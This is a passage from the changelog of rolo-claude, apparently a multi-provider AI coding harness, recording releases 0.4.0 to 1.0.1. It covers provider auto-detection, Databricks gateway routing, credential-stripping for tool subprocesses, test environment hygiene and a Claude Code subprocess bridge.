  `BRIDGE_TEST_HOME`/`BRIDGE_STATE_DIR` set -- `tests/run_all.py` now
  snapshots and restores every `BRIDGE_*`/`OPENROUTER_*`/`DATABRICKS_*`/
  `ANTHROPIC_*`/`TYPESAFE_*` env var AROUND EACH MODULE, so this can never
  happen regardless of any one module's own hygiene or import order; its
  own REAL SESSIONS GUARD also now catches a new DIRECTORY under the real
  sessions dir, not only a new `.jsonl` file (1972 empty slug directories,
  invisible to the old file-only glob, were found on the Windows build
  host). The same unscoped-real-machine-state bug also reached
  `~/.rolo-claude/mcp/tools-cache/` (lazy MCP tool caching, item 13's own
  H13 Part A, also resolves via `bridge_home()`) through one compat-matrix
  test that scoped its subprocess check but not its in-process one -- fixed
  the same way, by scoping before the in-process `build_manager` call. The
  `!cmd` inline-shell permission card is now registered with the session's
  own permission-waiter table too, so Shift+Tab/`/permissions` re-evaluates
  it through the exact same `reevaluate_pending_permission` path a live
  tool-call ask already uses, instead of leaving it unaffected by a mode
  change until answered by hand.
- **Addendum**: a bare `rolo-claude` typed outside the checkout did not
  work for the owner on the work VM, because the installed console script
  had never been put on PATH (only the checkout's own `bin/` wrapper had
  ever been used, from inside the checkout). `doctor` gained a "command on
  PATH" check -- OK names the resolved path; a WARN (not found, or
  resolving to the checkout's own `bin/` wrapper) names the exact reinstall
  command for whichever tool is present (`uv tool install --reinstall .`
  run from the checkout, else `pip install --user -e .`) and reminds that
  it's needed again after every `git pull`; `init`'s own Summary ends with
  the same check and, when it fails, the same fix line plus "run it from
  any directory -- the checkout is only for `git pull`." README's quick
  start and `docs/COMMANDS.md`'s `doctor`/`init` sections now say so too.

### Part 2 addenda (same release, same day): Opus 5.5, provider auto-detection, catalogs without init, OpenRouter balance

Four follow-up asks from the owner's live use on his personal Mac and his
work VM, landed the same day as Part 2 above. All with pinning tests;
`__version__` stays 1.0.1.

- **`cc:`/`ant:` explicit `opus-5.5`/`sonnet-5.5` aliases**: `opus`/`sonnet`
  are deliberately-moving "latest" pointers (today both resolve to the
  `-5-5` point release) -- nothing was labelled "5.5" anywhere, so a reader
  had to already know `opus` IS `claude-opus-5-5` to find it. The two new
  names resolve to the identical id the bare pointer already does; `/model`,
  `rolo-claude models` and the init picker now show the resolved id next to
  EVERY `cc:`/`ant:` alias (`cc:opus -> claude-opus-5-5 (latest Opus)`,
  `cc:opus-5.5 -> claude-opus-5-5`), reading as an enumeration the same way
  the Databricks group's own `[<family> · <path>]` tag already does. Full
  alias table in `docs/MODELS.md`.
- **Provider enablement rule REPLACED** (rolo, personal Mac: "never ran
  init... loves that the harness already finds the available keys and
  subscription and uses those"): detected credentials/a real claude.ai
  login now AUTO-enable a provider -- OpenRouter/Anthropic API (key)/
  TypeSafe once their key is found (env file, shell env, or the settings
  env chain), Databricks once a host AND token are found (same sources,
  plus `~/.databrickscfg`), Claude Code subscription (`cc:`) ONLY when
  `claude auth status` reports `loggedIn` with `authMethod` exactly
  `claude.ai` (never for an API-token/custom-base-url-driven `claude`, as
  on a work VM, loggedIn or not). `providers` in config.json now stores
  OVERRIDES only: an explicit `enabled: true`/`false` always wins over
  auto-detection; migration is now a permanent no-op (auto-detection
  already computes live what it used to write once). `/providers`/
  `rolo-claude providers` shows each provider as `auto (detected from
  <source>)` / `disabled by you` / `enabled by you` / `not set up`. A
  hand-typed `cc:` ref refused by pure auto-detection (never an explicit
  override) now names the SAME precise reason (not logged in / claude not
  installed / wrong authMethod, each with its own fix) a turn would have
  failed with anyway, reusing `agent.cc_runtime`'s own preflight check
  instead of a generic "not enabled" line; `doctor`'s default-model check
  got the matching fix for a syntactically-fine-but-unconfigured ref.
- **Catalogs exist without `init`, `/model` lists every enabled provider
  regardless of the current model** (rolo, Mac: "`/model` showed one
  OpenRouter row" because models.json had never been fetched, and it
  vanished entirely after switching to a `cc:` model): a background worker
  now fetches every ENABLED provider's catalog (OpenRouter `/models`,
  Anthropic `/v1/models` -> a new `ant-models.json` cache, Databricks
  endpoint discovery) once at app launch and whenever `/model` opens, if
  missing or older than `databricks.catalog_max_age_hours` (default 24h) --
  never on the UI thread, one dim note when something actually changed.
  `/models refresh`/`rolo-claude models --refresh` now refresh every
  enabled provider, not Databricks/OpenRouter only. `Controller.
  list_models()` already built each provider's group from its own cache
  independent of the session's current model -- the real fix was making
  sure that cache actually gets populated; verified a cached OpenRouter
  group survives switching the session to `cc:opus` unchanged.
- **OpenRouter account balance in the status bar** (rolo: "put the
  remaining balance of an api key... next to... the row of numbers under
  the chat"; corrected mid-round against OpenRouter's real OpenAPI spec --
  the key-info endpoint is `GET /key`, not `/auth/key`, and `/credits`
  needs a separate Management key): a new segment right after cost, `OR
  $12.40 left` or `OR $3.21 used`, populated by a background worker (never
  the UI thread) at launch, every 5 minutes, and once after every turn
  (debounced to at most once a minute). Three-way preference: THIS key's
  own `limit_remaining` (`GET /key`, the ordinary `OPENROUTER_API_KEY`)
  when it has a real limit; else the whole account's remaining credits
  (`GET /credits`, requiring a SEPARATE `OPENROUTER_MANAGEMENT_KEY` --
  never the ordinary key) when that key is configured; else this key's own
  `usage` (a spend figure, labelled "used" not "left" -- the honest
  fallback for an unlimited key with no management key). Both calls are
  best-effort and never raise; a failed refresh leaves whatever was cached
  before untouched (never blanks the segment); the figure dims (never
  disappears) once it's more than 10 minutes old; omitted entirely when
  OpenRouter isn't enabled or nothing has ever been fetched. `/cost` and
  `/providers` print the same cached figure, naming which of the three
  kinds it is, plus the key's own label and the time of the reading.
  `OPENROUTER_MANAGEMENT_KEY` documented in `docs/CONFIG.md`.
- **State-dir/env-scoping audit, round 2**: the SAME `BRIDGE_TEST_HOME`-
  leak class D2.1 found earlier in this release turned up again, three
  more times, now as a `providers`-block/credential-env leak instead of a
  session-log one -- each a test that pops a credential env var in its own
  setup but never restores it (only clears), silently wiping every LATER
  test's own default credential for the rest of that file's run once
  nothing upstream masked it anymore. Fixed in `test_h9b_findings.py`
  (`OPENROUTER_API_KEY`), `test_dbx_work_routing.py`'s own `_EnvSandbox`,
  and `test_work_box.py`'s `test_doctor_work_no_databricks_configured` --
  each now saves and restores the full set it touches, not just pops it.
  A new `tests/helpers/provider_env_defaults.py` gives the ~40 other test
  files that build `or:`/`dbx:`/`ant:` refs to test something else
  entirely (tool dispatch, hooks, compaction, permissions, steering, ...)
  a believable (never real) default credential, since `parse_model_ref`
  now refuses an auto-detected-disabled provider the same way it already
  refused an explicitly-disabled one.

`__version__` is unchanged.

### Final pass (same release, same day): secret-env hygiene and trust-aware Databricks resolution

Two more findings from the 1.0.1 part 2 fixpass review, each with its own pinning test; `__version__` stays 1.0.1.

- **`OPENROUTER_MANAGEMENT_KEY`/`TYPESAFE_API_KEY` now strip from every tool
  child's env**: the fixed secret-key list `tool_child_env`/`cc_child_env`
  use (so Bash/PowerShell/MCP/hooks and the `claude` subprocess never see a
  provider credential) was missing both -- the OpenRouter balance
  management key and the TypeSafe key could otherwise have leaked into a
  tool child's own environment.
- **`resolve_databricks()`'s settings-chain re-derivation is now trust-aware**:
  an untrusted project's own `.claude/settings.json`/`settings.local.json`
  `env` block is dropped before it ever reaches Databricks host/token
  resolution (the same trust gate a real session's `Settings.effective_env`
  already enforces), so a project can never pair its own host with the
  user's token; a token exported in the shell still pairs with a host kept
  in the user's own settings.json env block. Credential listings
  (`/providers`, the init tabs, doctor) apply the same trust rule, the
  user's statusLine script runs with the same stripped child env as hooks
  and tools, and the background catalog and balance workers detect a
  provider through the session's effective env, so a key that lives only
  in a settings.json env block still gets its catalog and balance. The
  launch-time catalog refresh,
  `/model`'s own open-time refresh, the OpenRouter balance worker, and the
  headless session-start Databricks thread now resolve credentials from the
  session's own trust-filtered `effective_env` instead of letting each one
  call bare `resolve_databricks()`/read `os.environ` on its own.

`__version__` is unchanged.

## [1.0.0] - 2026-09-30

rolo-claude 1.0.0: the stable general harness release. Summarises the
Databricks-first correctness/tooling work from the `V2-brief.md` line
(`docs/harness/V2-brief.md`) -- per-family request/stream/error correctness
across every gateway type a workspace can serve (the `0.7.0` line below),
and matrix-driven fixes plus roles (the `0.8.0` line below) -- and a
documentation pass on top of them. rolo-claude itself is unchanged in
scope: still the one general harness driving all four routes (OpenRouter,
Databricks, the Anthropic API, and a Claude subscription via `cc:`), not
renamed, with no new console-script alias.

- **0.7.0 (V2a) recap**: per-family correctness for every Databricks gateway
  dialect the harness routes to (native `anthropic/v1/messages`, `mlflow/
  v1/chat/completions`, `cursor/v1/chat/completions`, and the universal
  `/serving-endpoints/<name>/invocations` fallback) -- thinking/reasoning
  replay per family, usage/cost accounting per type, every error shape
  (400/401/403/404/413/429/5xx) classified correctly, and the two
  work-matrix open questions (reasoning replay after a tool call, route
  split from a stale cache) turned into runnable probes.
- **0.8.0 (V2b+V2c) recap**: `rolo-claude work-matrix show`/`apply` turns a
  `doctor --work --probe-all` report into a suggested fix per failing
  endpoint (and writes the one class of fix that maps onto a real
  `databricks.gateway.<endpoint>` config key); roles
  (`orchestrator`/`coder`/`reviewer`/`researcher`/`small`) let a team point
  different kinds of work at different models via `~/.rolo-claude/
  config.json`/`team.json`'s own `roles` table, `--role NAME=MODEL`,
  `Agent(role=...)`, `/roles`, and `stats --roles`.
- **Docs**: README now documents roles and the work-matrix show/apply
  workflow (real 0.8.0 features that had shipped without a README mention
  until now) and points to a separate sibling project,
  [databricks-claude](https://github.com/roloVibes/databricks-claude), for
  teams that want a Databricks-only edition; `docs/DATABRICKS.md` gained an
  end-to-end team-workflow section tying `team.json` -> `init` -> the work
  matrix -> roles together in one walkthrough; `docs/ROLES.md` cross-links
  it; `docs/harness/README.md`'s milestone index gained a `V2-brief.md` row.
- **Naming, for the record**: `docs/harness/V2-brief.md` (kept as originally
  written -- this project's own build-history convention, see
  `docs/harness/README.md`'s opening note) describes a planned V2d/V2e phase
  renaming this project to `databricks-claude`. That did not happen here --
  the owner instead spun off a **separate** `databricks-claude` repository
  as its own Databricks-only edition for teams, and rolo-claude stayed the
  general four-route harness, released as `1.0.0` rather than `2.0.0`.
- `__version__` -> 1.0.0.

## [0.8.0] - 2026-09-29

V2b+V2c: matrix-driven fixes tooling and roles. See `docs/harness/V2-brief.md`.

- **`rolo-claude work-matrix show/apply`** (`rolo_claude/work_matrix.py`):
  `show <report.json>` renders a `doctor --work --probe-all` JSON report as a
  table with a suggested action per failing endpoint -- 403 -> run this on
  the VPN; a non-200 row with a `--both`-probed "(anthropic gateway)"
  companion row that itself answered 200 -> set `databricks.gateway.
  <endpoint>: anthropic`; any other non-200 -> unknown, report it; a 200 with
  `tool_call_ok: false` -> change the family's tool-call rule in
  `model_table.json`; a 200 with `reasoning_replay_ok: false` -> disable
  thinking for tool loops on that endpoint. `apply <report.json> [--yes]`
  writes only the ONE class that maps onto a real config.json knob (the
  gateway override), after listing every write and asking for confirmation;
  the other three classes are report-only (no per-endpoint config key exists
  for them). Two synthetic sample reports under `tests/fixtures/work-matrix/`
  (`all-green.json`, `all-failures.json`, one row per failure class).
- **Fix: `providers/http.py::call_anthropic_native`'s 404 fallback no longer
  hardcodes the literal, non-existent endpoint name "anthropic"** (flagged
  during V2a) -- `/serving-endpoints/anthropic/v1/messages` is not a real
  workspace endpoint; the fallback now builds `/serving-endpoints/<the real
  endpoint name, from body["model"]>/invocations`, the SAME by-name
  universal fallback every other family/dialect already uses, with no query
  suffix (a plain invocations call never uses Databricks' `?beta=true`
  AI-gateway flag). `tests/helpers/mock_databricks.py`'s own anthropic-
  gateway dispatch is now body-shape-based (a top-level `system` field,
  never present on an openai-chat body) instead of matching that same wrong
  literal path.
- **Roles** (`rolo_claude/roles.py`, H15): `orchestrator`/`coder`/`reviewer`/
  `researcher`/`small` in `team.json` and `~/.rolo-claude/config.json`'s own
  `roles` key (team.json seeded into config.json once, at `init --preset
  work` time, by the same idempotent idiom `gateway_preference` already
  uses). Three new built-in agents -- `Coder` (full read/write tool set),
  `Reviewer` (read-only code review), `Researcher` (Explore's tools +
  WebSearch) -- alongside `general-purpose`/`Explore`/`Plan`, each with a
  fixed default role; a custom `.claude/agents/*.md` agent sets the same
  thing with a `role:` frontmatter key. Resolution precedence: an explicit
  `model=` always wins; then a `--role NAME=MODEL` CLI override for that
  agent's own role (repeatable; wins even over the agent's own file
  `model:` -- a deliberate, freshly-typed, run-only override); then the
  agent file's own `model:`; then the role table; then `CLAUDE_CODE_
  SUBAGENT_MODEL`/`settings.subagentModel`; then the parent/session model
  (`orchestrator`'s own documented default). The `Agent`/`Task` tool itself
  accepts a `role` argument overriding an agent's default role for just one
  call. Cost-aware defaults (DeepSeek V4.1 Flash for `researcher`/`small`)
  apply ONLY when the role table is completely empty AND the session's own
  model is a Databricks one -- documented in `docs/ROLES.md`, never
  automatic beyond that one case. `/roles` shows the resolved table (model,
  endpoint/path type, price) per role; `stats --roles` sums sub-agent spend
  per role from each Agent-tool call's own rolled-up usage node (tagged
  `role=`, additive -- a pre-V2c log simply has none).
- **Docs**: new `docs/ROLES.md`; `docs/DATABRICKS.md`'s own work-matrix
  section; `docs/COMMANDS.md`'s `work-matrix`/`--role`/`stats --roles`
  sections; `docs/SLASH-COMMANDS.md`'s `/roles` section.

## [0.7.0] - 2026-09-29

V2a: per-family Databricks correctness across every gateway type the harness
routes to (`anthropic/v1/messages`, `mlflow/v1/chat/completions`,
`cursor/v1/chat/completions`, `/serving-endpoints/<name>/invocations`), a
fixture test matrix driven by an extended `tests/helpers/mock_databricks.py`
speaking every dialect, and the two work-matrix open-question probes. See
`docs/harness/V2-brief.md`.

- **`tests/helpers/mock_databricks.py` speaks every dialect now**: the
  native `anthropic/v1/messages` gateway path is scenario-dispatched (it was
  hardcoded to one fixed "pong" reply) -- thinking blocks + signatures,
  tool_use (including Kimi's own verbatim `functions.<name>:<idx>` id), and
  the dialect's own 401/403-IP/404/overflow-400/429/5xx shapes; the
  openai-chat side gained 401/403-IP/404/500/context-overflow-400/413/
  finish_reason=length-minimal-output/Kimi-native-tool-id/cached-and-
  reasoning-token-usage/two-turn-reasoning-replay scenarios, plus path-aware
  404-then-fallback scenarios (mlflow-then-cursor, cursor-then-mlflow).
- **Per-family/per-type pinning tests** (`test_v2a_<family>_<type>_...`,
  five new files under `tests/`): Claude foundation/GLM/Kimi
  thinking+signature+cache_control+coding-agent-mode-header on the
  anthropic gateway (tested with and without thinking); DeepSeek/GPT/Grok/
  Gemini/gpt-oss reasoning decode+replay rules on mlflow; GLM's fixed
  sampling pair vs. Kimi/DeepSeek's server-fixed omission; the catalog's own
  `foundation_model.name` on the wire, `stream: true` explicit, the 32-tool
  cap + schema simplifier, and OTPM pre-admission against Kimi's real
  published rate limits; `gpt-5-5-pro`'s cursor-only route and the GPT
  family's mlflow-then-cursor fallback; Bedrock EXTERNAL Claude's
  invocations-only, model-less chat body with tool support; every error
  shape (400 unknown-field, 401, 403-IP, 404-to-exhaustion, 413,
  context-overflow-400, 429 with limit_type/retry_after, 5xx) and usage/cost
  accounting (cached + reasoning tokens, Databricks cost always "n/a", the
  catalog's DBU-rate-to-dollars conversion) per type.
- **Fix: a literal HTTP 413 is now non-retryable and classified
  `CONTEXT_WINDOW_EXCEEDED`** (`providers/errors.py`) -- `map_upstream_error`
  had no row for 413 and fell through to its own `should_retry=True`
  default, which won the `e.retryable or is_retryable_message(...)`
  short-circuit in `agent/loop.py` before `is_context_overflow_message`'s
  own (already-correct) unconditional 413-is-overflow rule ever got a
  chance to run -- a real 413 was silently retried up to `MAX_RETRIES`
  times against the identical, still-too-large body instead of surfacing as
  an overflow.
- **The two work-matrix open questions are now runnable probes**
  (`rolo_claude/work_matrix.py`, `doctor --work --probe-all --tools`): (1)
  reasoning replay after a tool call -- a real second turn, built through
  the exact same `providers.request` builders a live session uses (a
  genuinely signed `thinking` block on the anthropic dialect; the family's
  own `reasoning_echo` rule on the openai-chat dialect), is sent and its
  acceptance recorded per endpoint as `reasoning_replay_ok`; (2) route split
  from the cache -- `cached_path_type` (what `routes-cache.json` said
  before this run) alongside `path_type` (what this run actually used/
  re-cached) makes a stale-cache mismatch visible in the JSON report
  without a second run. Both fields are `None` when not applicable (no
  `--tools`, or nothing was cached yet) rather than a misleading default.
- `docs/DATABRICKS.md`/`docs/MODELS.md` updated: the work matrix's two new
  report fields, and a wording correction -- `databricks.dbu_price_usd`
  converts the catalog's own advertised DBU rate for the `/model` picker's
  informational display only; Databricks never reports a per-turn spend, so
  `/cost`/`stats` stay "n/a" regardless of whether that price is configured.
- `__version__` -> 0.7.0.

## [0.6.0] - 2026-09-29

H14: Databricks work-config parity -- zero-setup at work from Claude Code's
own settings, a generic family x api_type routing table (no vendored
endpoint list), doctor accuracy, team onboarding, and the work matrix. See
`docs/harness/H14-brief.md`.

- **Host/gateway split (scope A)**: `resolve_databricks()` now always
  returns the bare workspace root as `.host` -- a gateway path riding along
  in `ANTHROPIC_BASE_URL`/`DATABRICKS_HOST` (`.../ai-gateway/anthropic`) is
  split off into `.anthropic_gateway` instead of leaking into every derived
  URL. Fixes `doctor --work` building `/api/2.0/serving-endpoints` under the
  gateway path.
- **Custom headers (scope B)**: `ANTHROPIC_CUSTOM_HEADERS` (one or more
  "Name: value" lines, Claude Code's own settings.json convention) is parsed
  onto `DbxConfig.custom_headers` and merged onto every Databricks request
  (native passthrough and chat), under the default
  `x-databricks-use-coding-agent-mode: true` and any explicit override.
- **Model defaults/aliases at work (scope C)**: when Claude Code's own
  settings env resolves a Databricks config, the default model is
  `dbx:<ANTHROPIC_MODEL>` and bare `opus`/`sonnet`/`haiku` resolve through
  `ANTHROPIC_DEFAULT_*_MODEL` (falling back to pinned `databricks-claude-*`
  endpoints when unset) instead of the `cc:`/`ant:` subscription route or the
  OpenRouter default; `effortLevel`/`modelSettings.<id>.effortLevel` now
  actually set the session's default effort (previously unwired).
- **Generic family x api_type RULES table (scope D,
  `providers/dbx_routing.py`)**: family detected from the endpoint name (and,
  when cached, `foundation_model.name`/`model_class`) drives an ordered,
  endpoint-specific route built from the endpoint's OWN discovered
  `api_types` -- never a hand-maintained per-model list. Claude foundation
  defaults to the native anthropic gateway; GLM/Kimi default to mlflow chat
  with the anthropic gateway selectable per model (`databricks.gateway.
  <endpoint>` config or a `dbx:<endpoint>@anthropic` suffix); DeepSeek/Qwen/
  Llama/Gemma/gpt-oss default to mlflow chat, using the endpoint's real
  `foundation_model.name` as the wire model id (not a `system.ai.` prefix
  guess); GPT/Grok/Gemini default to mlflow chat, with `databricks-gpt-5-5-
  pro`'s own exception (no mlflow chat, cursor chat instead); Bedrock
  EXTERNAL Claude endpoints (`us-anthropic-claude-*`) are invocations-only
  and no longer misclassified as native Claude passthrough just because
  "claude" is in the name; a known non-chat endpoint (embeddings/whisper) is
  refused with a clear message and hidden from pickers. An unknown endpoint
  (not yet in the discovery cache) falls back to the pre-H14 static order.
- **doctor --work accuracy (scope E)**: prints the derived workspace root,
  gateway path, header NAMES (never values), default model, default effort,
  and which resolution step supplied the token; token-validity now
  distinguishes 401 (bad token), 403 with Databricks' own IP-access-list
  wording ("connect to the VPN"), 403 without it (token lacks list
  permission, inference may still work), and a wrong-path 404 -- previously
  every non-200 read as one generic "may only run inference" line. A host
  configured with no token yet still probes (a 401 without a token proves
  reachability) instead of skipping the network call.
- **Work matrix (scope H, `rolo-claude doctor --work --probe-all [--both]
  [--tools] [--only <glob>]`)**: one short pong per chat-shaped endpoint on
  its chosen path (plus the anthropic gateway too for Claude/GLM/Kimi with
  `--both`), a table of status/latency/output tokens/tool-call support, and
  a JSON report at `~/.rolo-claude/work-matrix-<date>.json` with endpoint
  names only -- no host, no token. Mock-verified (the real workspace is
  behind an IP access list from this box).
- **Team onboarding (scope I)**: a shared `team.json` (host, default model,
  per-family gateway preference, DBU price -- never a token, never an
  endpoint list) discovered at `.rolo-claude/team.json` (project),
  `~/.rolo-claude/team.json`, or `--team <path|url>`; `init --preset work`
  reads it (or Claude Code's own settings env) and asks ONLY for the token
  when a host is already known, hidden input, 0600 env file. `/model`
  groups Databricks endpoints by family, shows the chosen path type, and
  hides non-chat endpoints. `team.example.json` added.
- **`/models refresh` (alias `/dbx`) (scope J)**: re-lists the workspace
  catalog off the UI thread, updates `~/.rolo-claude/dbx-endpoints.json`, and
  reports a one-line added/removed/changed diff; `rolo-claude models
  --refresh --urls [--json]` prints the exact URL and path type per
  endpoint. Auto-refresh (`databricks.catalog_max_age_hours`, default 24h)
  on `/model` open and (silently, for an already-cached catalog only) on
  session start; an offline/403 refresh keeps the existing cache.
- `__version__` -> 0.6.0.

## [0.5.0] - 2026-09-29

H13 (RECOMMENDATIONS.md P1): lazy MCP start by default, inline images in the
terminal, `/resume` search, and the first live family-baseline pass for
GLM-5.3/Qwen/MiniMax/Kimi K2.7-code/Kimi K3. See `docs/harness/H13-brief.md`.

- **Lazy MCP by default**: every configured server is now lazy unless it's
  `alwaysLoad` or explicitly `"mcpLazy": false` (per-server, or globally via
  a new top-level `"mcpLazy": false` in `settings.json`) -- reversing the
  pre-0.5.0 "eager unless `mcpLazy: true`" default. A per-server tool cache
  under `~/.rolo-claude/mcp/tools-cache/<server>.json` (keyed by a hash of
  the server's own command/args/env/url/headers) means a lazy server's tool
  names/descriptions are still known -- and findable/preloadable -- before
  it's ever connected: no cache yet (first run, or the config changed)
  connects it once to learn its tools and writes the cache; a valid cache
  seeds a new `"cached"` handle state with zero connections. A tool call, or
  `/mcp`'s own reconnect, connects a cached/lazy server for real on demand;
  a live tool list that turns out to differ from what the cache promised
  refreshes the catalog and surfaces a short note on that same call. Status
  bar/`/mcp`/`mcp list`/`doctor` all show the new `"cached"` state (`doctor`
  additionally reports each lazy server's cache age). Every uncached server
  needing a real connect (a first run against N configured servers) does so
  CONCURRENTLY (`McpManager.start_many`), not one at a time -- a real bug
  from live dogfooding this milestone's own acceptance line surfaced before
  any fix landed (up to N times MCP_TIMEOUT, worse than the pre-0.5.0 eager
  path, which was already concurrent).
- **Inline images in the terminal**: a screenshot/image tool result renders
  inline via the kitty graphics protocol (kitty, WezTerm, Ghostty, foot) or
  sixel (other terminals, detected live), with the existing type/size/
  dimensions caption as the fallback everywhere else (no real tty, tmux
  without `allow-passthrough on`, detection finds nothing, or `images:
  "caption"`/`"off"` in `~/.rolo-claude/config.json` / `--no-inline-images`).
  `textual-image` (PyPI) was evaluated per the brief and rejected on both
  grounds it named: its own repo declares LGPL-3.0 (not permissive) and it
  requires Python >=3.12 (this project supports >=3.10) -- the kitty/sixel
  encoders are implemented directly instead (`rolo_claude/tui/images.py`);
  Pillow (the existing `vision` extra, now also `pip install rolo-claude
  [images]`) enables the sixel encoder and bounded downscaling for both
  protocols, but nothing here requires it (kitty decodes PNG/JPEG itself).
- **`/resume` search**: the session picker (TUI `/resume`, and an ambiguous/
  no-match `--resume <text>` at TUI startup -- previously silently ignored
  outside print mode, now genuinely wired through `build_session`) gets a
  live text filter, fuzzy-ranked over title/first prompt/cwd/model;
  `--resume <text>` in print mode picks the unique match or lists the
  ambiguous candidates instead of silently guessing the most recent one.
- **Family baselines**: `docs/harness/FAMILY-BASELINE-2026-09-29.md` --
  live acceptance rows for GLM-5.3, Qwen3.8 Flash, MiniMax M3, Kimi
  K2.7-code and Kimi K3 on OpenRouter (pong, a 200-line Read, a Write ->
  Edit -> Bash chain, one steer; Kimi K3 kept to the cheap pong+Read subset
  per the brief).

## [0.4.1] - 2026-09-28

H12 (RECOMMENDATIONS.md P0): the whole first run in one command, a
prescriptive `doctor`, and the cheapest fix for DeepSeek V4.1 Flash's own
telemetry-observed 8% Edit "Found multiple matches" rate. See
`docs/harness/H12-brief.md`.

- **`rolo-claude init`** (`rolo_claude/init_cli.py`): picks a preset
  (`home`/OpenRouter, `work`/Databricks, `claude`/your subscription --
  auto-detected, or `--preset`/`--yes` for non-interactive), asks for a
  missing OpenRouter key or Databricks host/token with hidden input and
  writes it into the same env file the harness already reads (POSIX mode
  0600, dir 0700, existing lines preserved, never echoed), sets
  `~/.rolo-claude/config.json`'s `model` key, runs `doctor` and `models
  --refresh`, sends a live pong, and (Linux only) offers a static `rg`
  install into `~/.local/bin` and the `~/.local/bin`-on-PATH rc-file line
  (`~/.zshenv` for zsh, `~/.profile` otherwise, behind a marker comment) --
  every step is idempotent, so re-running only ever reports the current
  state. Never touches `~/.claude.json`/`~/.claude/settings.json`, never
  prints a key/token. `~/.rolo-claude/config.json`'s `model` now sits in the
  default-model precedence chain (`--model` > `BRIDGE_MODEL`/`routes.json`
  > config.json > the built-in default) that both `-p` and the TUI resolve
  through (`model.resolve_default_model_raw`, `headless.build_session`).
- **Prescriptive `doctor`**: every `[WARN]`/`[MISSING]` line now ends with
  `-> fix: <exact command>` or `-> see: <reference>`; `doctor --json` prints
  the same checks as `{id, status, message, fix, see}` records (what `init`
  consumes for its own summary). New checks: `~/.local/bin` on PATH for a
  non-interactive shell, `tmux` mouse mode when `$TMUX` is set, configured
  MCP servers (eager vs. `mcpLazy`), and the default model in
  `config.json` plus whether its provider actually resolves.
- **Edit tool context hint** (`rolo_claude/providers/model_table.json`'s new
  `edit_hints` map, `providers/profiles.edit_hint_for`): a DeepSeek/Kimi/
  GLM/Qwen/MiniMax-family session's Edit tool description gets one extra
  line asking for at least three lines of `old_string` context, computed
  once when the frozen tool catalog is built so the wire request stays
  cache-prefix-stable; Claude/GPT sessions are unaffected, byte for byte.
- **README/INSTALL.md**: a "Quick start (Kali / Linux)" section leads the
  README now (install, `rolo-claude init`, `rolo-claude`, then Windows in
  five lines); INSTALL.md points to `init` up front.

## [0.4.0] - 2026-09-28

H11: Claude models through the user's own Claude subscription (`cc:` route)
plus first-class `ant:` aliases for the same six models via
`ANTHROPIC_API_KEY`. See `docs/harness/H11-brief.md` (and the H11b fix-pass
review below, `docs/harness/review-findings-h11.md`). Binding constraint: rolo-claude never reads, copies or
replays Claude Code's OAuth credentials (`~/.claude/.credentials.json`) and
never calls `api.anthropic.com` with them -- the subscription is used the one
legitimate way, by driving the installed `claude` binary headlessly under the
user's own login, with rolo-claude's own tools exposed to it through a local
MCP bridge. rolo-claude keeps its own tools, permissions, hooks, session log
and telemetry for every `cc:` turn.

- **Aliases (`rolo_claude/providers/cc_models.py`)**: `cc:fable`/`opus`/
  `opus-5`/`opus-5.0`/`opus-4.8`/`opus-4.6`/`sonnet`/`sonnet-5`/`haiku` ->
  `claude-fable-5-1`/`claude-opus-5-5`/`claude-opus-5`/`claude-opus-5`/
  `claude-opus-4-8`/`claude-opus-4-6`/Claude Code's own `sonnet`/
  `claude-sonnet-5`/Claude Code's own `haiku`; `ant:` gets the SAME nine
  names resolved to real API ids; a bare alias with no prefix resolves to
  `cc:` (a subscription login and no `ANTHROPIC_API_KEY`), `ant:` (the key
  set), or an error naming both; any full id and a trailing `[1m]` suffix
  pass through unchanged. Context/output/pricing for all nine come from a
  vendored table (OpenRouter's own `anthropic/*` catalog rows), refreshable
  live via `rolo-claude models --cc --refresh`. `doctor` and the `/model`
  picker ("Claude subscription (via Claude Code)" group) both surface this.
- **Transport (`rolo_claude/agent/cc_process.py`, `rolo_claude/ccbridge/`)**:
  one `claude -p --output-format stream-json --input-format stream-json
  --verbose --include-partial-messages --tools "" --strict-mcp-config
  --mcp-config <inline> --settings '{"disableAllHooks":true}'
  --permission-mode bypassPermissions --session-id/--resume <uuid5 of the
  rolo session id>` subprocess per `cc:` session, lazily started, stdin held
  open across turns -- every flag verified live against the installed
  claude 2.1.281/2.1.284. The `--mcp-config` names one stdio server, "rolo"
  (`python -m rolo_claude.ccbridge`), so Claude Code exposes every bridged
  tool as `mcp__rolo__<Name>`; the child forwards `tools/list`/`tools/call`
  to a `ToolBridgeServer` in the parent process (a Unix socket, mode 0600,
  on POSIX; a TCP loopback socket + a random per-session token on
  Windows) which runs the real dispatch -- permission decide, PreToolUse/
  PostToolUse hooks, the tool's own run, the session log, TUI events --
  for every call, with Claude Code's own tool_use id kept verbatim. Esc
  kills the subprocess (process group, no orphans) and synthesizes
  interrupted results for anything still in flight; the next turn restarts
  with `--resume`. A steer sends its line to the running subprocess
  immediately (Claude Code queues it on its own). Switching models into
  `cc:` mid-session primes the new subprocess with the prior log as one
  `<conversation-so-far>` message; switching away needs nothing special
  (every `cc:` turn already logged ordinary user/assistant/tool_result
  nodes). `stats --models`/`/cost` show `cc:` rows with `total_cost_usd`
  marked as Claude Code's own estimate, never real per-token billing.
- **Tests**: `tests/helpers/fake_claude_cc.py` (a scripted `claude` stand-in
  that also acts as a REAL MCP client against the real `ccbridge` child) plus
  `tests/test_cc_models.py`, `tests/test_ccbridge_server.py`,
  `tests/test_cc_session.py` -- 53 tests covering alias resolution, the
  bridge's own wire protocol (both transports), lazy start/reuse/kill,
  tools/list parity with the frozen catalog, deny rules, a live interactive
  permission card, hooks firing exactly once, pairing invariants across an
  Esc mid-call, the `estimate` usage flag, `--resume` after a restart and
  after a fresh `--continue`-shaped process, steering, a cc:<->or: model
  switch, and the credentials file never being opened.

### H11b fix pass (same 0.4.0 milestone, no version bump)

A 28-finding review of the H11 work above (2 critical, 12 major, 14 minor --
`docs/harness/review-findings-h11.md`) found the `cc:` route's steering
accounting could hang a turn forever, and the `claude` subprocess inherited
this process's whole environment (provider keys, an outer Claude Code
session's own identity) instead of a stripped one. Both are fixed, along
with the rest of the findings:

- **Steering (critical)**: `claude` now runs with `--replay-user-messages`;
  every stdin line is tracked in a FIFO until its own `isReplay` echo
  confirms claude actually consumed it, and a turn ends at a `result` only
  once that FIFO is empty -- correct whether a steer is absorbed into the
  turn already running (one result covers both) or answered as its own
  follow-up turn (queued lines get a combined reply). A steer is logged
  only once consumed, never at send time.
- **Child environment (critical)**: the `claude` subprocess and its MCP
  child now get `tool_child_env()` minus every `ANTHROPIC_*`/`CLAUDE_CODE_*`
